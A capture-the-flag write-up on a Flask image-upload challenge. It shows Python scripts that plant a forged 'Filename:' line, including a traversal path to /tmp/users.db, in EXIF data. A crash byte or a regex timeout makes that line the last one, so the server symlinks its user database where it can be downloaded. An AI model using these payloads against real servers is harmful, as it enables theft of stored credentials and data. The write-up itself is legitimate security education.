# Boing \[500 points\] (1 solve)

This challenge gave us a flask server which allows you to create an account, upload images, and receive a metadata file with attributes of the image. The file `app.py` contains all of the server logic, while `compute.py` generates a metadata file (`*.meta`) which is generated from whatever image you upload. 

![Final solution](https://i.imgur.com/9sTl6ES.jpeg)
<br>
*Final image payload*

## The Attack Vector

We can see in `pages/index.html` that the image's score in the metadata needs to be over 100,000 to get the flag:

```html
    ...
    <p>
        <a href="/get/{{ file }}">{{ file }}</a> (<a href="/get/{{ file }}.meta">META</a>)
        {% if score > 100_000 %}
            SCORE: {{ score }} (🔥) {{ flag }}
        {% else %}
            SCORE: {{ score }}
        {% endif %}
    </p>
    ...
```

Yet, after taking a look at how the score is calculated:

```py
score = math.log(len(faces) * contrast * area + 1)
fout.write('Score: %f\n' % score)
fout.flush()
```

We can see that this is impossible.

Since the score is calculated by taking the natural logarithm of the product of the amount of faces in the image, the contrast in the image, and the area of the image, the combined value of all of these factors would need to be greater than e^100,000. For obvious reasons this attack vector isn't feasible—especially when considering the 10kbs upload limit.

### The Real Exploit

Before we create an exploit for this server, it would be helpful to gain a basic understanding of the program.

After you've uploaded an image to the server, `compute.py` is ran immediately as a subprocess:

```py
    output_file = fpath + '.meta'
    cmd = ['python3', 'compute.py', fpath, output_file]
    subprocess.run(cmd, timeout=1)
```

The algorithm in `compute.py` creates the metadata, calculates the image's score and adds the filename to the end of the file.

```
== metadata ==
Faces: 5
Contrast: 0.100000
Area: 320120
Score:  5.204282
ImageDescription: This is my custom exif data!
Timestamp: Thu Nov 21 16:25:53 2024
Filename: c14a81fd86e74c9ee75a3e96c5935ee3.jpg
== end ==
```

The interesting part of this metadata file is that the filename at the bottom of the metadata is used to symlink files from the `/tmp` directory to the `./static` directory in the project directory:

```py
@app.route('/process', methods=['GET', 'POST'])
def process_file():
    ...
    with open(abs_file_path, 'r') as f:
        metadata_file = None
        for line in f:
            if line.startswith('Filename: '):
                metadata_file = line.split(': ')[1].strip()
    ...
    new_file_path = os.path.join(user_static_dir, os.path.basename(metadata_file))
    os.symlink(original_file_path, new_file_path)
    new_meta_file_path = os.path.join(user_static_dir, os.path.basename(metadata_file) + '.meta')
    os.symlink(abs_file_path, new_meta_file_path)

```

So, if we could craft malicious EXIF data to insert a different another filename into the metadata file, we could theoretically symlink any file into the user's static directory.

The biggest problem with this is the lack of a base case; the `for` loop never ends. Thus, the last filename in the metadata is the one that's used to symlink to. This is a bit of a problem, but we'll touch on this later. For now, we know that we could potentially symlink something useful to our static directory.

And aren't we in luck. The flag is inserted into the database when the web challenge starts up:

```py
if __name__ == '__main__':
    ...
    if not c.fetchone():
        c.execute('INSERT INTO users VALUES ("flagflagflagflag", "flag", ?)', ('ictf{f4ke_f1aG_bo1nG_b0ing_8oiNG}',))
```

Meaning that stealing the sqlite database in `/tmp/users.db` is the most plausible way to get the flag.


## Execution

Now we'll address the problem from earlier; how do you force one of the lines you insert into the EXIF data to be the last line in the file when the last thing that the `compute.py` file does is set the filename?

```py
...
fout.write('Timestamp: %s\n' % time.ctime())
fout.write('Filename: %s\n' % os.path.basename(input_file))
fout.write('== end ==\n')

fout.close()    
```

We'll need to somehow break out of this script before it can reach the end.

This script is what we used. In particular, our filename is added to the metadata file with the ImageDescription EXIF data, and the UserComment crashes `compute.py` in order to allow our ImageDescription to be the last thing added to the metadata file.

```py
from PIL import Image

IMAGE_DESC = 0x010E
USER_COMMENT = 0x9286

input_file = "./input.jpg"
output_file = "./output.jpg"

desc_payload = "\n\nFilename: /tmp/users.db"  # symlink to users.db
comment_payload = b'\x80' # crash when reading user comment

image = Image.open(input_file)
exif = image.getexif()
exif[IMAGE_DESC] = desc_payload
exif[USER_COMMENT] = comment_payload

image.save(output_file, exif=exif)
```
In this script, we're taking advantage of invalid UTF-8 sequences to crash compute.py. This code contains a payload with the byte `\x80`—a continuation byte in UTF-8 encoding. Continuation bytes (10xxxxxx) are used in multi-byte sequences and must come after a valid leading byte, which specifies the structure and length of the character. By starting with a continuation byte instead of a valid leading byte, we deliberately create an invalid UTF-8 sequence, causing Python to throw a decoding error when it attempts to process these bytes.

This is what happens in `compute.py` when it tries to process our malicious JPG:
```bash
solution $ python3 compute.py
...
Reading Image Description: '\n\nFilename: /tmp/users.db'
Reading User Comment: b'\x80'
Traceback (most recent call last):
  File "~/iCTF/boing/compute.py", line 52, in <module>
    value = value.decode()
            ^^^^^^^^^^^^^^
UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
```

As you can see, the script reads our image description and crashes when reading the user comment.

And this is the metadata output from `compute.py`:

```bash
solution $ cat output_metadata.txt
== metadata ==
Faces: 1
Contrast: 0.9
Area: 100000
Score: 9.0
ImageDescription: 

Filename: /tmp/users.db <--- last filename tag in the file is from our exif data
```


To summarize, we've created a `.jpg` which will crash `compute.py` early, meaning that the  the path we control (`/tmp/users.db`) is the last filename in the metadata file. Given that `app.py` reads the last `Filename:` metadata tag, the server will now correctly symlink `/tmp/users.db` into our `static` directory. 

#### Intended solution

As cool as our solution was, using invalid Unicode bytes wasn't the intended solution. If you look in `main.py`:

```py
def compute_metadata(fpath):
    output_file = fpath + '.meta'
    cmd = ['python3', 'compute.py', fpath, output_file]
    subprocess.run(cmd, timeout=1) # 1 second timeout isn't enough to parse long regex
```

The `compute.py` is ran with a timeout of 1 second. Yet, `compute.py` parses the UserComment EXIF data with regex, a regex which can take > 3 seconds to execute (even with really small input). Because of this timeout, you can insert a filename in the user comment EXIF tag before a `USER=` to make `compute.py` time out before it adds all of the metadata (e.g. the original filename). Here's the problem author @p_nack's example of timing out the regex:

```py
from PIL import Image
from PIL.ExifTags import TAGS

image = Image.new('RGB', (1, 1))
exif = image.getexif()
reverse_tags = {v: k for k, v in TAGS.items()}

exif[reverse_tags['UserComment']] = b'USER=foo:111231111111111111111111111111111111111111 ;\nFilename: ../../../../tmp/users.db\n'

img_out_fname = os.path.dirname(__file__) + '/img_out.jpg'
image.save(img_out_fname, exif=exif)

print(f'Image saved to {img_out_fname}')
```

Regardless, both of our scripts achieve the same final result of setting a custom value to symlink from in the `Filename:` metadata tag.

### Stealing the Database

For us, that was the easy part. We could symlink `users.db` into our static folder, but no matter what we tried, we couldn't access the `users.db` file.

The chief source of our agony could be directly attributed to this code:

```py
@app.route('/get/<file_name>')
def get_file(file_name):
    if not is_jpg_ext(file_name) and not file_name.endswith('.meta'):
        return 'Invalid file extension', 400

    user_static_dir = os.path.join(STATIC_DIR, str(session['user_id']))
    fpath = os.path.join(user_static_dir, file_name)
    return app.send_static_file(os.path.join(str(session['user_id']), file_name))
```

This is the code that is used to serve static files, while validating that the extension is a valid JPG or META file. This thwarts any attempts at `GET`ing the database (`*.db`), and even though we tried injecting lots of weird characters between the extension and the `users.db` in the request to `/get/users.db`, the URI Encoding on the characters meant that nothing would change the fact that only `.jpg` and `.meta` extensions could be requested from `/get`.

This is where hint #2 comes in:

https://www.geeksforgeeks.org/how-to-serve-static-files-in-flask/


Since this hint is the cheapest, it's a link to a(n incredibly unhelpful) GeeksforGeeks article. This article almost seems useless as a resource, devoid of any real substance, so I didn't understand the purpose of this as a hint. Yet, the answer is revealed as early as the first HTML sample in the article:

```html
<html> 
<head> 
	<title>Flask Static Demo</title> 
	<link rel="stylesheet" href="/static/style.css" /> 
</head> 
<body> 
	<h1>{{message}}</h1> 
</body> 
</html> 
```

Did you catch that? Yup, the CSS file is loaded through `/static`. Instead of going through the `/get` endpoint, we can simply query `/static/USER_ID/users.db` to steal the database and the flag. This means that we'll need to grab our `user_id` from the Flask session. To achieve this end, I took the session cookie, which looked something like this:

```
session: eyJ1c2VyX2lkIjoiYzcyZDdkNzRiYjQxNWRjNTBhMDNjOGQ3ZDZkNDQ4NWMiLCJ1c2VybmFtZSI6InRlc3QifQ.Z0LCgQ.SddyjDYtQ53zamdtems3rJGSeZ0
```

And ran this it through a Flask session ID decoder:

https://www.kirsle.net/wizards/flask-session.cgi

This resulted in a JSON object, something like this:

```json
{
    "user_id": "c72d7d74bb415dc50a03c8d7d6d4485c",
    "username": "test"
}
```

Now, we can finally grab the database by downloading it from the static URL `/static/c72d7d74bb415dc50a03c8d7d6d4485c/users.db`!

Ultimately, the flag is in plaintext in the database.

```
ictf{b01ng_b01ng_U_g0t_me}
```

<img src="https://i.imgur.com/Ny02UrS.png" height="500"></img>

## Conclusion


This challenge was wild. Not only was it the hardest challenge to be complete by a High School team, but it was only solved by 4/27 undergraduate teams. 

Also, over the course of this challenge, I exclusively registered and used two accounts: test:test and admin:admin. The JPG containing the EXIF payload was uploaded under the test account. On the final day, two different teams logged into the system and discovered the JPGs I had uploaded (I only know this because they each contacted me about this). If either team had examined the EXIF data in any of the JPGs, they would have uncovered at least half of the solution. Fortunately, neither of them noticed.

